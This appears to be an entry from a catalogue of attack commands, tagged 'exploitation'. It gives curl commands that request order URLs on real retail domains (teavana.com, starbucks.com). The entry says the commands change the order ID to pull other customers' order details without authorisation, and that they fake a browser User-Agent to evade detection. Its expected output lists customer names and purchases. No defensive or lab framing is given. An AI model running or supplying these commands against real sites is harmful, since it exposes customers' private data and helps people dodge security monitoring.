---
data: >-
  curl -X GET "https://www.teavana.com/orders/12345" -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.334Z'
id: 08446e5e-6370-468f-bc11-46484831547a
verified: false
validated: true
submitted: true
---
# curl-parameter-manipulation

## Command

```bash
curl -X GET "https://www.teavana.com/orders/12345" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command uses curl to perform an HTTP GET request to a vulnerable order endpoint, manipulating the order_id parameter to access unauthorized data. It simulates a browser request to evade basic detection and retrieves sensitive order details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL (e.g., https://www.teavana.com/orders/12345) | Target endpoint with manipulated parameter | Yes |
| `-H "User-Agent: ..."` | Mimics a browser header to blend with normal traffic | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.starbucks.com/orders/67890"
```

### Advanced Usage

```bash
curl -X GET "https://www.teavana.com/orders/12345" -H "User-Agent: Mozilla/5.0" -v
```

> The -v flag adds verbose output for debugging headers and responses.

## Expected Output

A successful response (HTTP 200) containing order details in JSON or HTML, such as {"order_id": 12345, "customer_name": "John Doe", "items": [...], "total": 25.99}. Failure would return 403 or empty data.

## Related

- [[Related Procedure]]
